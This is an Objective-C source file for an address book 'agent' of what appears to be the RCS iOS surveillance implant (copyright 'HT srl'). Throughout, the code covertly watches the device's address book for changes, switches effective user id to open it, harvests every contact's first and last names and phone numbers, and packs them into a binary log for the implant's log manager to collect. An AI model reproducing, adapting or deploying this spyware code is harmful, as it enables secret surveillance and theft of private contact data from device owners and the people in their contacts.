/*
 * RCSIpony - messages agent
 *
 *
 * Created by Massimo Chiodini on 12/12/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <AddressBook/AddressBook.h>
#import <sys/types.h>
#import <pwd.h>

#import "RCSIAgentAddressBook.h"

//#define DEBUG
//#define ALL_ADDRESS ~0
#define ALL_ADDRESS (NSTimeInterval)0

static RCSIAgentAddressBook *sharedAgentAddressBook = nil;

// Now the status is updated by agent Calendar
static BOOL gAgentStopped = FALSE;

@interface RCSIAgentAddressBook (hidden)

- (int)_incSemaphore;
- (int)_decSemaphore;
- (BOOL)_getAgentABProperty;
- (BOOL)_setAgentABProperty;
- (BOOL)_writeABLog: (NSMutableArray *)records;
- (BOOL)_getAddressBook: (ABAddressBookRef)addressBookA
           withDateTime: (CFAbsoluteTime)dateTime;

@end

// AB Notification callback
static void  ABNotificationCallback(ABAddressBookRef addressBook,
                                    CFDictionaryRef info,
                                    void *context) 
{  
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  RCSIAgentAddressBook *agentAB = (RCSIAgentAddressBook *) context;
  
  // Semaphore signaled
  int sem = 0;
  sem = [agentAB _incSemaphore];
  
#ifdef DEBUG  
  NSLog(@"ABNotificationCallback: notification received with observer %@ and info %@. (0x%X) semaphore count = %d", 
        agentAB, info, info, sem);
#endif
  
  [pool release];
  
  return; 
}

@implementation RCSIAgentAddressBook (hidden)

- (int)_incSemaphore
{
  @synchronized(self)
  {
    if (abChanges == 0)
      abChanges++;
  }
  
  return abChanges;
}

- (int)_decSemaphore
{
  @synchronized(self)
  {
    if (abChanges > 0)
      abChanges--;
  }
  
  return abChanges;
}

- (BOOL)_setAgentABProperty
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSNumber *number = [[NSNumber alloc] initWithDouble: mLastABDateTime];
  NSDictionary *abDict      = [[NSDictionary alloc] initWithObjects: [NSArray arrayWithObjects: number, nil]
                                                            forKeys: [NSArray arrayWithObjects: @"AB_LASTMODIFIED", nil]];
  NSDictionary *agentDict   = [[NSDictionary alloc] initWithObjects: [NSArray arrayWithObjects: abDict, nil]
                                                            forKeys: [NSArray arrayWithObjects: [[self class] description], nil]];
  
  setRcsPropertyWithName([[self class] description], agentDict);
  
  [agentDict release];
  [abDict release];
  [number release]; 
  [pool release];
  
  return YES;
}

- (BOOL)_getAgentABProperty
{
  NSDictionary *agentDict = nil;
  
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];

#ifdef DEBUG
  NSLog(@"_getAgentABProperty: getting property list!");
#endif
  
  agentDict = rcsPropertyWithName([[self class] description]);
  
  if (agentDict == nil) 
    {
#ifdef DEBUG
      NSLog(@"_getAgentABProperty: getting prop failed!");
#endif
      mLastABDateTime = 0;
    }
  else 
    {
      mLastABDateTime = [[agentDict objectForKey: @"AB_LASTMODIFIED"] doubleValue];
    }

#ifdef DEBUG
  NSLog(@"_getAgentABProperty: mLastABDateTime %lu", mLastABDateTime);
#endif  
  
  [outerPool release];
  
  return YES;
}

- (ABAddressBookRef)_getAddressBookRef
{
  // fix for iOS4
//  struct passwd     *ePasswd;
  int               eUid;
  ABAddressBookRef  addressBook;
  
  // Current euser id
  eUid = geteuid();

#ifdef DEBUG    
  NSLog(@"_getAddressBookRef: euid= %d", eUid);
#endif 
  
  // Get uid for query mobile user AddressBook
  // ePasswd = getpwnam("mobile");
  
//  if (ePasswd == NULL) 
//    {
//#ifdef DEBUG    
//      NSLog(@"_getAddressBookRef: error get uid for mobile users");
//#endif   
//      return NULL;
//    }
  
#ifdef DEBUG 
  NSLog(@"_getAddressBookRef: before seteuid uid %d, euid %d gid %d", 
        getuid(), geteuid(), getgid());
#endif
  
  // Setting the id and run the query
  if( seteuid(501/*ePasswd->pw_uid*/) < 0)
    {
#ifdef DEBUG 
      NSLog(@"_getAddressBookRef: cannot seteuid from mobile user");
      //free(ePasswd);
      return NULL;
#endif    
    }
  
#ifdef DEBUG   
  NSLog(@"_getAddressBookRef: after seteuid uid %d, euid %d, gid %d", 
        getuid(), geteuid(), getgid());
#endif
  
  // Open AddressBook
  addressBook = ABAddressBookCreate();
  
  // Reverting the privs
  if( seteuid(eUid) < 0)
    {
#ifdef DEBUG    
    NSLog(@"_getAddressBookRef: cannot revert uid for prev users");
#endif 
      CFRelease(addressBook);
      //free(ePasswd);
      return NULL;
    }
  
  //free(ePasswd);
  return addressBook;
}

typedef struct _Names {
#define   CONTACTNAME    0xC025  
  int     magic;  
  int     len;
  //wchar_t buffer[1];
} Names;

typedef struct _ABNumbers {
#define   CONTACTNUM    0xC024  
  int     magic;
  int     type;
  //Names   number;
} ABNumbers;

typedef struct _ABContats {
#define   CONTACTCNT    0xC023 
  int         magic;
  int         numContats;
  //ABNumbers contact[1];
} ABContats;

typedef struct _ABFile {
#define     CONTACTFILE 0xC022  
  int       magic;
  int       len;
  //Names      first;
  //Names      last;
  //ABContacts contact[1];
} ABFile;

typedef struct _ABLogStrcut {
#define   CONTACTLIST   0xC021
  int     magic;
  int     len;
  int     numRecords;
  //ABFile  file[1];
} ABLogStrcut;

- (BOOL)_writeABLog: (NSMutableArray *)records
{
  NSMutableData *abData = [[NSMutableData alloc] initWithCapacity: 0];
  ABLogStrcut header;
  ABFile      abFile;
  ABContats   abContat;
  ABNumbers   abNumber;
  Names       abNames;
  
  // setting magic
  header.magic    = CONTACTLIST;
  abFile.magic    = CONTACTFILE; 
  abContat.magic  = CONTACTCNT;
  abNumber.magic  = CONTACTNUM;
  abNames.magic   = CONTACTNAME;
  
  header.numRecords = [records count];
  header.len        = 0xFFFFFFFF;
  
  // Add header
  [abData appendBytes: (const void *) &header length: sizeof(header)];
  
  for (int i=0; i< [records count]; i++) 
    {
      NSDictionary *rec   = (NSDictionary *) [records objectAtIndex: i];
    
      NSString *firstN    = [rec objectForKey: @"First"];
      NSString *lastN     = [rec objectForKey: @"Last"];
      NSMutableArray *num = [rec objectForKey: @"Numbers"];
      
      // New contact
      abFile.len   = 0;
      [abData appendBytes: (const void *) &abFile length: sizeof(abFile)];
      
      // FirstName abNames
      abNames.len = [firstN lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
      [abData appendBytes: (const void *) &abNames length: sizeof(abNames)];
      [abData appendBytes: (const void *) [[firstN dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes] length: abNames.len];
      
      // LastName abNames
      abNames.len = [lastN lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
      [abData appendBytes: (const void *) &abNames length: sizeof(abNames)];
      [abData appendBytes: (const void *) [[lastN dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes] length: abNames.len];
      
      // Telephone numbers
      abContat.numContats = [num count];
      [abData appendBytes: (const void *) &abContat length: sizeof(abContat)];
      
      for (int a=0; a < [num count]; a++) 
        {
          NSDictionary *telNum = [num objectAtIndex: a];
          
          abNumber.type = a;
          [abData appendBytes: (const void *) &abNumber length: sizeof(abNumber)];
        
//          NSString *label = [telNum objectForKey: @"Label"];
//          abNames.len = [label lengthOfBytesUsingEncoding: NSUTF8StringEncoding];
//        
//          [abData appendBytes: (const void *) &abNames length: sizeof(abNames)];
//          [abData appendBytes: (const void *) [label UTF8String] length: abNames.len];
        
          NSString *number = [telNum objectForKey: @"Number"];
          abNames.len = [number lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
          
          [abData appendBytes: (const void *) &abNames length: sizeof(abNames)];
          [abData appendBytes: (const void *) [[number dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes] length: abNames.len];
        }
    }
  
    // Setting len of NSData - sizeof(magic)
    ABLogStrcut *logS = (ABLogStrcut *) [abData bytes];
    logS->len = [abData length] - (sizeof(logS->magic) + sizeof(logS->len));
  
#ifdef DEBUG
  NSLog(@"_writeABLog: abData %@", abData);
#endif
  
  // No additional param header required
  RCSILogManager *logManager = [RCSILogManager sharedInstance];
  
  BOOL success = [logManager createLog: LOG_ADDRESSBOOK
                           agentHeader: nil
                             withLogID: 0];
  // Write data to log
  if (success == TRUE)
    {
    if ([logManager writeDataToLog: abData
                          forAgent: LOG_ADDRESSBOOK
                         withLogID: 0] == TRUE)
      [logManager closeActiveLog: LOG_ADDRESSBOOK withLogID: 0];
    }

  return YES;
}

- (BOOL)_getAddressBook: (ABAddressBookRef)addressBookA
           withDateTime: (CFAbsoluteTime)dateTime
{
  int                     sem = 0;
  CFDateRef               cfDateTime;
  CFStringRef             firstName, lastName, compositeName;
  CFStringRef             phoneNumber, phoneNumberLabel;
  CFArrayRef              people;
  CFAbsoluteTime          currDateTime, lMaxDateTime = dateTime;
  ABMutableMultiValueRef  multi;
  ABAddressBookRef        addressBook;
  NSMutableArray          *abRecords = nil, *numbers = nil;
  NSDictionary            *telNum, *rec;
  static CFStringRef      nullName = CFSTR("");
  
#ifdef DEBUG
  NSLog(@"_getAddressBook: run with datetime %ld", dateTime);
#endif
  
  // Reset semaphore for realtime changes
  if (dateTime > ALL_ADDRESS) 
    {
#ifdef DEBUG    
      NSLog(@"_getAddressBook: semaphore count before = %d", abChanges);
#endif
      sem = [self _decSemaphore];
#ifdef DEBUG    
      NSLog(@"_getAddressBook: semaphore count after  = %d", sem);
#endif     
    }
  
  // Get the mobile user AB
  addressBook = [self _getAddressBookRef];
  
  if (addressBook == NULL) 
    {
#ifdef DEBUG    
      NSLog(@"_getAddressBook: error setting uid");
#endif 
      return NO;
    }
  
  if (ABAddressBookHasUnsavedChanges(addressBook) == YES)
    {
#ifdef DEBUG
      NSLog(@"_getAddressBook: have unsaved data");
#endif
      return YES;
    }
  else 
    {
#ifdef DEBUG
      NSLog(@"_getAddressBook: doesn't have unsaved data");
#endif
    }
  
  // Dump all person on the addressBook
  people = ABAddressBookCopyArrayOfAllPeople(addressBook);
  
  if (people == NULL) 
    {
#ifdef DEBUG
      NSLog(@"_getAddressBook: haven't records");
#endif
      return NO;
    }
  
  CFIndex count = CFArrayGetCount(people);
  
#ifdef DEBUG
  NSLog(@"_getAddressBook: num of addresses %d, dateTime %lu", count, dateTime);
#endif
  
  abRecords = [[NSMutableArray alloc] initWithCapacity:0];
  
  for (int i=0; i<count; i++) 
    {
      ABRecordRef person = CFArrayGetValueAtIndex(people, i);
       
      if (person != NULL && ABRecordGetRecordType(person) == kABPersonType) 
        {
          compositeName = ABRecordCopyCompositeName(person);
          firstName     = ABRecordCopyValue(person, kABPersonFirstNameProperty);
          lastName      = ABRecordCopyValue(person, kABPersonLastNameProperty); 
          multi         = ABRecordCopyValue(person, kABPersonPhoneProperty);
          cfDateTime    = ABRecordCopyValue(person, kABPersonModificationDateProperty);

          if (cfDateTime  != NULL)
            {
              currDateTime  = CFDateGetAbsoluteTime(cfDateTime);
#ifdef DEBUG
              //NSLog(@"_getAddressBook: currDateTime %d ", currDateTime);
#endif
            }
          else 
            {
#ifdef DEBUG
              //NSLog(@"_getAddressBook: record datetime null");
#endif             
              if (firstName != NULL)  CFRelease(firstName);
              if (lastName != NULL)   CFRelease(lastName);
              if (multi != NULL)      CFRelease(multi);
              continue;
            }

          if ((lastName != NULL || firstName != NULL) && 
               multi != NULL && 
              (dateTime == ALL_ADDRESS || currDateTime > dateTime))
            {
              // Update last record parsed 
              if (currDateTime > lMaxDateTime)
                lMaxDateTime = currDateTime;
            
              numbers   = [[NSMutableArray alloc] initWithCapacity: 0];
            
              for (CFIndex i = 0; i < ABMultiValueGetCount(multi); i++) 
                {
                  phoneNumberLabel = ABMultiValueCopyLabelAtIndex(multi, i);
                  if (phoneNumberLabel == NULL) 
                    continue;
                  phoneNumber      = ABMultiValueCopyValueAtIndex(multi, i);
                  if (phoneNumber == NULL) 
                    {
                      CFRelease(phoneNumberLabel);
                      continue;
                    }
#ifdef DEBUG     
                  NSString *label = (NSString *)phoneNumberLabel;
                  NSLog(@"_getAddressBook: [%@] composite Name %@, first Name %@, last Name %@, phone [%s:%@]", 
                        cfDateTime, 
                        compositeName != NULL ? compositeName : nullName,
                        firstName     != NULL ? firstName : nullName, 
                        lastName      != NULL ? lastName : nullName, 
                        [label cStringUsingEncoding: NSASCIIStringEncoding] , phoneNumber);
#endif           
                  telNum = [[NSDictionary alloc] initWithObjectsAndKeys: (NSString *)phoneNumberLabel, @"Label", 
                                                                         (NSString *)phoneNumber, @"Number", nil]; 
                  [numbers addObject: telNum];
                
                  [telNum release];
                
                  CFRelease(phoneNumberLabel);
                  CFRelease(phoneNumber);
                }
            
              rec = [[NSDictionary alloc] initWithObjects: [NSArray arrayWithObjects: firstName != NULL ? (NSString *)firstName : (NSString *)nullName, 
                                                                                      lastName  != NULL ? (NSString *)lastName : (NSString *)nullName,
                                                                                      numbers,  
                                                                                      nil]
                                                  forKeys: [NSArray arrayWithObjects: @"First", 
                                                                                      @"Last", 
                                                                                      @"Numbers", 
                                                                                      nil]];
              
              [abRecords addObject: rec];
#ifdef DEBUG
              NSLog(@"_getAddressBook: object %@ added to array, count = %d", rec, [abRecords count]);
#endif
              [numbers release];
              [rec release];
            }
           
          if (firstName != NULL)  CFRelease(firstName);
          if (lastName != NULL)   CFRelease(lastName);
          if (multi != NULL)      CFRelease(multi);
          if (cfDateTime != NULL) CFRelease(cfDateTime);
        }
    }
  
  // Write the log...
  if ([abRecords count]) 
    [self _writeABLog: abRecords];
  
  // Release objects
  [abRecords release];
  CFRelease(people);
  CFRelease(addressBook);
  
  // Update globals and plist
  if (mLastABDateTime < lMaxDateTime) 
    {
      mLastABDateTime = lMaxDateTime;
      [self _setAgentABProperty];
    }

#ifdef DEBUG
  NSLog(@"_getAddressBook: mLastABDateTime %lu ", mLastABDateTime);
#endif 
  
  return YES;
}

@end


@implementation RCSIAgentAddressBook

@synthesize mAgentConfiguration;

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

+ (RCSIAgentAddressBook *)sharedInstance
{
  @synchronized(self)
  {
    if (sharedAgentAddressBook == nil)
      {
        //
        // Assignment is not done here
        //
        [[self alloc] init];
      }
  }
  
  return sharedAgentAddressBook;
}

+ (id)allocWithZone: (NSZone *)aZone
{
  @synchronized(self)
  {
    if (sharedAgentAddressBook == nil)
      {
        sharedAgentAddressBook = [super allocWithZone: aZone];
        
        //
        // Assignment and return on first allocation
        //
        return sharedAgentAddressBook;
      }
  }
  
  // On subsequent allocation attemps return nil
  return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
  return self;
}

- (id)retain
{
  return self;
}

- (unsigned)retainCount
{
  // Denotes an object that cannot be released
  return UINT_MAX;
}

- (void)release
{
  // Do nothing
}

- (id)autorelease
{
  return self;
}

- (id)init
{
  Class myClass = [self class];
  
  @synchronized(myClass)
  {
    if (sharedAgentAddressBook != nil)
      {
        self = [super init];
        
        if (self != nil)
          {
            //mLastABDateTime = ~0;
            mLastABDateTime = 0;
            abChanges = 0;
            sharedAgentAddressBook = self;            
          }
      }
  }
  
  return sharedAgentAddressBook;
}

#pragma mark -
#pragma mark Agent Formal Protocol Methods
#pragma mark -

#define CHANGE_TIME 30
#define WAIT_TIME   2
#define RL_TIME     1

- (void)start
{
  id                messageRawData;
  ABAddressBookRef  addressBook;
  NSTimeInterval    waitSec = WAIT_TIME;
  
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
  messageRawData = [mAgentConfiguration objectForKey: @"data"];
  [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];  
  
#ifdef DEBUG
  NSLog(@"Agent AddressBook started");
#endif 
  
  // Get property
  [self _getAgentABProperty];
  
  // Open AddressBook
  addressBook = [self _getAddressBookRef];
  
  if (addressBook == NULL) 
    {
#ifdef DEBUG
      NSLog(@"Agent AddressBook cannot open mobile user addressbook");
#endif
      return;
    }
  
  // add the callback for messages (privateFrameworks): registered on main thread runloop!
  ABAddressBookRegisterExternalChangeCallback(addressBook, ABNotificationCallback, (void *) self);
  
#ifdef DEBUG
  NSLog(@"start: AddressBook agent setting callback on context 0x%X on callback 0x%x (mLastABDateTime = %lu)", 
        self, (void *) ABNotificationCallback, mLastABDateTime);
#endif
  
  // running for the very first time (mLastABDateTime = 0)
  if(mLastABDateTime == ALL_ADDRESS)
    {
#ifdef DEBUG
      NSLog(@"start: AddressBook run filter collector %ld", mLastABDateTime);
#endif
      [self _getAddressBook: addressBook withDateTime: ALL_ADDRESS];
    }
  else 
    {
#ifdef DEBUG
      NSLog(@"start: AddressBook not run filter collector %ld", mLastABDateTime);
#endif
    }

  NSPort *aPort = [NSPort port];
  [[NSRunLoop currentRunLoop] addPort: aPort 
                              forMode: NSRunLoopCommonModes];
  
  while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOP &&
         [mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];

      if (abChanges > 0 && waitSec == CHANGE_TIME) 
        {
          // Ok fetch changes
          [self _getAddressBook: addressBook withDateTime: mLastABDateTime];
          waitSec = WAIT_TIME;
        }
      
      // First AB change: it will sleep waitSec*RL_TIME 
      if (abChanges > 0 && waitSec == WAIT_TIME)
          waitSec = CHANGE_TIME;
    
      // Wait waitSec*RL_TIME seconds before fetching AB
      for (int i=0; i<waitSec; i++) 
        {        
          // Check for agent stopped
          if ([mAgentConfiguration objectForKey: @"status"] == AGENT_STOP)
            {
#ifdef DEBUG
              NSLog(@"start: AddressBook Agent stop notification received");
#endif
              break;
            }
          [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow: RL_TIME]];
        }
    
      [innerPool release];
    }
  
  ABAddressBookUnregisterExternalChangeCallback(addressBook, ABNotificationCallback, (void *)self);
  
  CFRelease(addressBook);
  
  if ([mAgentConfiguration objectForKey: @"status"] == AGENT_STOP)
  {
    // Agent Calendar set the status to STOPPED
#ifdef JSON_CONFIG
    [mAgentConfiguration setObject: AGENT_STOPPED
                            forKey: @"status"];
#endif
    gAgentStopped = TRUE;
  }
  [outerPool release];
}

- (BOOL)stop
{
  int internalCounter = 0;
  
  [mAgentConfiguration setObject: AGENT_STOP forKey: @"status"];
  
#ifdef JSON_CONFIG
  while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED
         && internalCounter <= 5)
    {
      internalCounter++;
      sleep(1);
    }
#else  
  while (gAgentStopped != TRUE &&
         internalCounter <= MAX_WAIT_TIME)
    {
      internalCounter++;
      sleep(1);
    }
#endif
#ifdef DEBUG 
  NSLog(@"Agent AddressBook stopped");
#endif
  
  return YES;
}

- (BOOL)resume
{
  return YES;
}

- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration
{
  if (aConfiguration != mAgentConfiguration)
    {
      [mAgentConfiguration release];
      mAgentConfiguration = [aConfiguration retain];
    }
}

- (NSMutableDictionary *)mAgentConfiguration
{
  return mAgentConfiguration;
}

@end
